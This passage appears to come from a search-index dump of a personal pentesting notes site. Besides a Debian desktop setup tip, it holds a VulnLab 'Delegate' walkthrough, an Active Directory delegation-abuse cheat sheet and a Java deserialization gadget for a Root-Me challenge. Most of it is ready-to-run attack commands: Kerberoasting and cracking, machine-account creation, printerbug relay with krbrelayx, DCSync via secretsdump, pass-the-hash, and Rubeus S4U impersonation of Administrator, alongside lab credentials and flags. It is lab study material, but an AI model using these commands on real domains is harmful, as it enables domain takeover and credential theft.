class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install kali-desktop-gnome\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#then select gdm3\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eadd extension :\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install gnome-shell-extension-manager\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003esearch for transparent top-bar , then install it and finally adjust the value\nAdd an Apple look with this  :\nhttps://www.gnome-look.org/p/1403328/\nhttps://www.gnome-look.org/p/1102582/\nhttps://www.gnome-look.org/p/1148748/\nhttps://www.youtube.com/watch?v=ymFNDSDqFDE\u003c/p\u003e","tags":[],"title":"Debian-Setup"},{"content":"Scan\nPORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-08-09 17:46:22Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: delegate.vl0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3269/tcp open tcpwrapped 3389/tcp open ms-wbt-server Microsoft Terminal Services | ssl-cert: Subject: commonName=DC1.delegate.vl | Not valid before: 2024-08-08T17:45:40 |_Not valid after: 2025-02-07T17:45:40 |_ssl-date: 2024-08-09T17:47:03+00:00; -2s from scanner time. | rdp-ntlm-info: | Target_Name: DELEGATE | NetBIOS_Domain_Name: DELEGATE | NetBIOS_Computer_Name: DC1 | DNS_Domain_Name: delegate.vl | DNS_Computer_Name: DC1.delegate.vl | Product_Version: 10.0.20348 |_ System_Time: 2024-08-09T17:46:23+00:00 Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -2s, deviation: 0s, median: -2s | smb2-time: | date: 2024-08-09T17:46:26 |_ start_date: N/A | smb2-security-mode: | 311: |_ Message signing enabled and required\rUser :\nawk \u0026#39;{print $6}\u0026#39; us.txt| cut -d \u0026#39;\\\u0026#39; -f 2 \u0026gt; users.txt DC1$ A.Briggs b.Brown R.Cooper J.Roberts N.Thompson Password:\n[+] delegate.vl\\A.Briggs:P4ssw0rd1#123\rAll generic write on N.THOMPSON:\nbloodhound-python -d \u0026#39;delegate.vl\u0026#39; -u \u0026#39;A.Briggs\u0026#39; -p \u0026#39;P4ssw0rd1#123\u0026#39; -ns 10.10.112.18 -dc DC1.delegate.vl -c all targetedKerberoast.py -v -d \u0026#39;delegate.vl\u0026#39; -u \u0026#39;A.Briggs\u0026#39; -p \u0026#39;P4ssw0rd1#123\u0026#39; john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt password: KALEB_2341 ------------------------------------------------------------------------------- #Doesn\u0026#39;t work pywhisker.py -d \u0026#34;delegate.vl\u0026#34; -u \u0026#34;A.Briggs\u0026#34; -p \u0026#34;P4ssw0rd1#123\u0026#34; --target \u0026#34;N.THOMPSON\u0026#34; --action \u0026#34;add\u0026#34; gettgtpkinit.py delegate.vl/N.Thompson -cert-pfx 2R7BnP5C.pfx -pfx-pass FOvfSWBoYdd0WWqNtCv1 N.thompson.ccache\rCred : N.Thompson : KALEB_2341\rUser: VL{29f9de899146d9a73574b873855eefef}\nevil-winrm -i $t -u \u0026#34;N.Thompson\u0026#34; -p \u0026#34;KALEB_2341\u0026#34; nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq\rEnum unconstrained Delegation\nGet-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True}\rPowermad :\nImport-Module ./Powermad.ps1 New-MachineAccount -MachineAccount pwned -Password $(ConvertTo-SecureString \u0026#39;12345\u0026#39; -AsPlainText -Force) Set-MachineAccountAttribute -MachineAccount pwned -Attribute useraccountcontrol -Value 528384 Set-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/pwned.delegate.vl -Append Get-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose dnstool.py -u \u0026#39;delegate.vl\\pwned$\u0026#39; -p 12345 -r pwned.delegate.vl -d 10.8.3.12 --action add DC1.delegate.vl -dns-ip $t krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC printerbug.py delegate.vl/\u0026#39;UwU$\u0026#39;@dc1.delegate.vl UwU.delegate.vl\rhttps://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1 Linux :\n0 dnstool.py -u \u0026#39;delegate.vl\\UwU$\u0026#39; -p TestPassword321 -r UwU.delegate.vl -d 10.8.3.12 --action add DC1.delegate.vl -dns-ip $t addspn.py -u \u0026#39;delegate.vl\\N.Thompson\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; -s \u0026#39;cifs/UwU.delegate.vl\u0026#39; -t \u0026#39;UwU$\u0026#39; -dc-ip 10.10.85.247 DC1.delegate.vl --additional addspn.py -u \u0026#39;delegate.vl\\N.Thompson\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; -s \u0026#39;cifs/UwU.delegate.vl\u0026#39; -t \u0026#39;UwU$\u0026#39; -dc-ip 10.10.85.247 DC1.delegate.vl bloodyAD.py -u \u0026#39;N.Thompson\u0026#39; -d \u0026#39;delegate.vl\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; --host \u0026#39;DC1.delegate.vl\u0026#39; add uac \u0026#39;UwU$\u0026#39; -f TRUSTED_FOR_DELEGATION krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC printerbug.py delegate.vl/\u0026#39;UwU$\u0026#39;@dc1.delegate.vl UwU.delegate.vl\rDumping hashes export KRB5CCNAME=`pwd`/\u0026#39;krbtgt.ccache secretsdump.py -k DC1.delegate.vl -just-dc-ntlm hash : c32198ceab4cc695e65045562aa3ee93 evil-winrm -i $t -u \u0026#34;Administrator\u0026#34; -H \u0026#34;c32198ceab4cc695e65045562aa3ee93\u0026#34;\rRoot : VL{1205f239c3aaaf1e6f7ac423a1fb3c16}\n","date":"2023-09-07","id":38,"permalink":"/notes/lab/vulnlab/delegate/","summary":"\u003cp\u003eScan\u003c/p\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ePORT     STATE SERVICE       VERSION\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e53/tcp   open  domain        Simple DNS Plus\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e88/tcp   open  kerberos-sec  Microsoft Windows Kerberos \u003cspan class=\"o\"\u003e(\u003c/span\u003eserver time: 2024-08-09 17:46:22Z\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e135/tcp  open  msrpc         Microsoft Windows RPC\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e389/tcp  open  ldap          Microsoft Windows Active Directory LDAP \u003cspan class=\"o\"\u003e(\u003c/span\u003eDomain: delegate.vl0., Site: Default-First-Site-Name\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e445/tcp  open  microsoft-ds?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e464/tcp  open  kpasswd5?\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e636/tcp  open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3269/tcp open  tcpwrapped\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e3389/tcp open  ms-wbt-server Microsoft Terminal Services\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e ssl-cert: Subject: \u003cspan class=\"nv\"\u003ecommonName\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eDC1.delegate.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e Not valid before: 2024-08-08T17:45:40\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_Not valid after:  2025-02-07T17:45:40\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_ssl-date: 2024-08-09T17:47:03+00:00\u003cspan class=\"p\"\u003e;\u003c/span\u003e -2s from scanner time.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e rdp-ntlm-info:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Target_Name: DELEGATE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Domain_Name: DELEGATE\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   NetBIOS_Computer_Name: DC1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Domain_Name: delegate.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   DNS_Computer_Name: DC1.delegate.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   Product_Version: 10.0.20348\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  System_Time: 2024-08-09T17:46:23+00:00\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eService Info: Host: DC1\u003cspan class=\"p\"\u003e;\u003c/span\u003e OS: Windows\u003cspan class=\"p\"\u003e;\u003c/span\u003e CPE: cpe:/o:microsoft:windows\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eHost script results:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_clock-skew: mean: -2s, deviation: 0s, median: -2s\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-time:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   date: 2024-08-09T17:46:26\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_  start_date: N/A\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e smb2-security-mode:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e   311:\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e|\u003c/span\u003e_    Message signing enabled and required\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cp\u003eUser :\u003c/p\u003e","tags":[],"title":"Delegate"},{"content":"SeEnableDelegationPrivilege Chack the MAQ : nxc ldap $DOMAIN_CONTROLLER -d $DOMAIN -u $USER -p $PASSWORD -M maq\rCreate a a computer Unconstrained Delegation (Powermad) Import-Module ./Powermad.ps1 New-MachineAccount -MachineAccount pwned -Password $(ConvertTo-SecureString \u0026#39;12345\u0026#39; -AsPlainText -Force) Set-MachineAccountAttribute -MachineAccount pwned -Attribute useraccountcontrol -Value 528384 Set-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/pwned.delegate.vl -Append Get-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose\rCreate a a computer Unconstrained Delegation (Impacket) addcomputer.py -dc-ip $t -computer-pass TestPassword321 -computer-name UwU delegate.vl/N.Thompson:\u0026#39;KALEB_2341\u0026#39; addspn.py -u \u0026#39;delegate.vl\\N.Thompson\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; -s \u0026#39;cifs/UwU.delegate.vl\u0026#39; -t \u0026#39;UwU$\u0026#39; -dc-ip 10.10.85.247 DC1.delegate.vl --additional addspn.py -u \u0026#39;delegate.vl\\N.Thompson\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; -s \u0026#39;cifs/UwU.delegate.vl\u0026#39; -t \u0026#39;UwU$\u0026#39; -dc-ip 10.10.85.247 DC1.delegate.vl bloodyAD.py -u \u0026#39;N.Thompson\u0026#39; -d \u0026#39;delegate.vl\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; --host \u0026#39;DC1.delegate.vl\u0026#39; add uac \u0026#39;UwU$\u0026#39; -f TRUSTED_FOR_DELEGATION\rUnconstrained Delegation #ADS_UF_TRUSTED_FOR_DELEGATION\nEnumerate Uncontrained Delegation : Get-NetComputer -Unconstrained #Powerview Get-ADComputer -Filter {TrustedForDelegation -eq $True} Get-ADUser -Filter {TrustedForDelegation -eq $True}\rAdd SPN (Impacket) : addspn.py -u \u0026#39;delegate.vl\\N.Thompson\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; -s \u0026#39;cifs/UwU.delegate.vl\u0026#39; -t \u0026#39;UwU$\u0026#39; -dc-ip 10.10.85.247 DC1.delegate.vl --additional addspn.py -u \u0026#39;delegate.vl\\N.Thompson\u0026#39; -p \u0026#39;KALEB_2341\u0026#39; -s \u0026#39;cifs/UwU.delegate.vl\u0026#39; -t \u0026#39;UwU$\u0026#39; -dc-ip 10.10.85.247 DC1.delegate.vl\rAdd SPN (Powermad) : Set-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/pwned.delegate.vl -Append Get-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose\rGrab CCache dnstool.py -u \u0026#39;delegate.vl\\UwU$\u0026#39; -p TestPassword321 -r UwU.delegate.vl -d 10.8.3.12 --action add DC1.delegate.vl -dns-ip $t krbrelayx.py -hashes :C7BE3644A2EB37C9BB1F248E9E0B9AFC printerbug.py delegate.vl/\u0026#39;UwU$\u0026#39;@dc1.delegate.vl UwU.delegate.vl\rDumping hashes export KRB5CCNAME=`pwd`/\u0026#39;krbtgt.ccache secretsdump.py -k DC1.delegate.vl -just-dc-ntlm\rConstrained Delegation #TRUSTED_TO_AUTH_FOR_DELEGATION\nEnumerate with powerview : Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne \u0026#34;$null\u0026#34;} -Properties msDS-AllowedToDelegateTo\rGet a ticket : rubeus.exe asktgt /user:userName /domainDomainName /ntlm:Hash /outfile:FileName.tgt\rImpersonate Administrator : .\\Rubeus.exe s4u /ticket:TGT_Ticket /msdsspn:\u0026#34;service/HOST\u0026#34; /impersonateuser:Administrator /ptt\rCheck accounts with \u0026ldquo;Trusted for Delegation\u0026rdquo; Get-ADUser -Filter {TrustedForDelegation -eq $true} -Property SamAccountName, TrustedForDelegation\rWith linux : getST.py tengu.vl/gMSA01$ -spn \u0026#39;MSSQLSvc/SQL.tengu.vl:1433\u0026#39; -impersonate \u0026#39;T1_M.WINTERS\u0026#39; -hashes :d4b65861e85773fba2035b31ebcacb37 -dc-ip DC.tengu.vl #Look for user in the group RBCD( Resource-based constrained ) With linux # Read the attribute rbcd.py -delegate-to \u0026#39;target$\u0026#39; -dc-ip \u0026#39;DomainController\u0026#39; -action \u0026#39;read\u0026#39; \u0026#39;domain\u0026#39;/\u0026#39;PowerfulUser\u0026#39;:\u0026#39;Password\u0026#39; # Append value to the msDS-AllowedToActOnBehalfOfOtherIdentity rbcd.py -delegate-from \u0026#39;controlledaccount\u0026#39; -delegate-to \u0026#39;target$\u0026#39; -dc-ip \u0026#39;DomainController\u0026#39; -action \u0026#39;write\u0026#39; \u0026#39;domain\u0026#39;/\u0026#39;PowerfulUser\u0026#39;:\u0026#39;Password\u0026#39; getST.py -spn \u0026#39;cifs/target\u0026#39; -impersonate Administrator -dc-ip \u0026#39;DomainController\u0026#39; \u0026#39;domain/controlledaccountwithSPN:SomePassword\u0026#39;\rWith windows Rubeus.exe s4u /nowrap /impersonateuser:\u0026#34;administrator\u0026#34; /msdsspn:\u0026#34;cifs/target\u0026#34; /domain:\u0026#34;domain\u0026#34; /user:\u0026#34;controlledaccountwithSPN\u0026#34; /rc4:$NThash\r","date":"2023-09-07","id":39,"permalink":"/notes/ad/delegation/","summary":"\u003ch4 id=\"seenabledelegationprivilege\"\u003eSeEnableDelegationPrivilege\u003c/h4\u003e\n\u003cul\u003e\n\u003cli\u003eChack the MAQ :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enxc ldap \u003cspan class=\"nv\"\u003e$DOMAIN_CONTROLLER\u003c/span\u003e -d \u003cspan class=\"nv\"\u003e$DOMAIN\u003c/span\u003e -u \u003cspan class=\"nv\"\u003e$USER\u003c/span\u003e -p \u003cspan class=\"nv\"\u003e$PASSWORD\u003c/span\u003e -M maq\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCreate a a computer Unconstrained Delegation (Powermad)\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eImport-Module ./Powermad.ps1\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eNew-MachineAccount -MachineAccount pwned -Password \u003cspan class=\"k\"\u003e$(\u003c/span\u003eConvertTo-SecureString \u003cspan class=\"s1\"\u003e\u0026#39;12345\u0026#39;\u003c/span\u003e -AsPlainText -Force\u003cspan class=\"k\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSet-MachineAccountAttribute -MachineAccount pwned -Attribute useraccountcontrol -Value \u003cspan class=\"m\"\u003e528384\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eSet-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Value HTTP/pwned.delegate.vl -Append\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eGet-MachineAccountAttribute -MachineAccount pwned -Attribute ServicePrincipalName -Verbose\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003cul\u003e\n\u003cli\u003eCreate a a computer Unconstrained Delegation (Impacket)\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaddcomputer.py -dc-ip \u003cspan class=\"nv\"\u003e$t\u003c/span\u003e -computer-pass TestPassword321 -computer-name UwU delegate.vl/N.Thompson:\u003cspan class=\"s1\"\u003e\u0026#39;KALEB_2341\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaddspn.py -u \u003cspan class=\"s1\"\u003e\u0026#39;delegate.vl\\N.Thompson\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;KALEB_2341\u0026#39;\u003c/span\u003e -s \u003cspan class=\"s1\"\u003e\u0026#39;cifs/UwU.delegate.vl\u0026#39;\u003c/span\u003e -t \u003cspan class=\"s1\"\u003e\u0026#39;UwU$\u0026#39;\u003c/span\u003e -dc-ip 10.10.85.247 DC1.delegate.vl --additional\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaddspn.py -u \u003cspan class=\"s1\"\u003e\u0026#39;delegate.vl\\N.Thompson\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;KALEB_2341\u0026#39;\u003c/span\u003e -s \u003cspan class=\"s1\"\u003e\u0026#39;cifs/UwU.delegate.vl\u0026#39;\u003c/span\u003e -t \u003cspan class=\"s1\"\u003e\u0026#39;UwU$\u0026#39;\u003c/span\u003e -dc-ip 10.10.85.247 DC1.delegate.vl\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebloodyAD.py -u \u003cspan class=\"s1\"\u003e\u0026#39;N.Thompson\u0026#39;\u003c/span\u003e -d \u003cspan class=\"s1\"\u003e\u0026#39;delegate.vl\u0026#39;\u003c/span\u003e -p \u003cspan class=\"s1\"\u003e\u0026#39;KALEB_2341\u0026#39;\u003c/span\u003e --host \u003cspan class=\"s1\"\u003e\u0026#39;DC1.delegate.vl\u0026#39;\u003c/span\u003e add uac \u003cspan class=\"s1\"\u003e\u0026#39;UwU$\u0026#39;\u003c/span\u003e -f TRUSTED_FOR_DELEGATION\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\r\n  \u003c/figure\u003e\r\n\u003c/div\u003e\r\n\u003ch4 id=\"unconstrained-delegation\"\u003eUnconstrained Delegation\u003c/h4\u003e\n\u003cp\u003e#ADS_UF_TRUSTED_FOR_DELEGATION\u003c/p\u003e","tags":[],"title":"Delegation"},{"content":" Custom gadget java Deserialization : package com.rootme.serial; import java.io.*; import java.nio.charset.StandardCharsets; import com.rootme.serial.OwnBase64; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.util.Base64; public class Main { public static void main(String[] args) { try { // Créer un tableau OwnBase64 avec la commande encodée OwnBase64[] encodedCommand = { new OwnBase64(\u0026#34;aGVhZA==\u0026#34;), new OwnBase64(\u0026#34;Li4vZmxhZy50eHQ=\u0026#34;) }; DebugHelper debugHelper = new DebugHelper(encodedCommand, Boolean.TRUE); String serializedObject = serialize(debugHelper); System.out.println(\u0026#34;Serialized object: \u0026#34; + serializedObject); } catch (Exception e) { System.err.println(\u0026#34;An error occurred during serialization/deserialization: \u0026#34; + e.getMessage()); e.printStackTrace(); } } public static String serialize(Object item) { final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); final ObjectOutputStream objectOutputStream; try { objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(item); objectOutputStream.close(); byte[] bytes = Base64.getEncoder().encode(byteArrayOutputStream.toByteArray()); return new String(bytes, StandardCharsets.US_ASCII); } catch (IOException e) { throw new Error(e); } } }\r","date":"2023-09-07","id":40,"permalink":"/notes/web/deserialization/","summary":"\u003cul\u003e\n\u003cli\u003eCustom gadget java Deserialization :\u003c/li\u003e\n\u003c/ul\u003e\n\r\n\r\n\r\n\u003cdiv class=\"expressive-code\"\u003e\r\n  \u003cfigure class=\"frame is-terminal not-content\"\u003e\r\n  \u003cfigcaption class=\"header\"\u003e\r\n    \u003cspan class=\"title\"\u003e\u003c/span\u003e\r\n  \u003c/figcaption\u003e\r\n  \u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-sh\" data-lang=\"sh\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epackage com.rootme.serial\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eimport java.io.*\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan 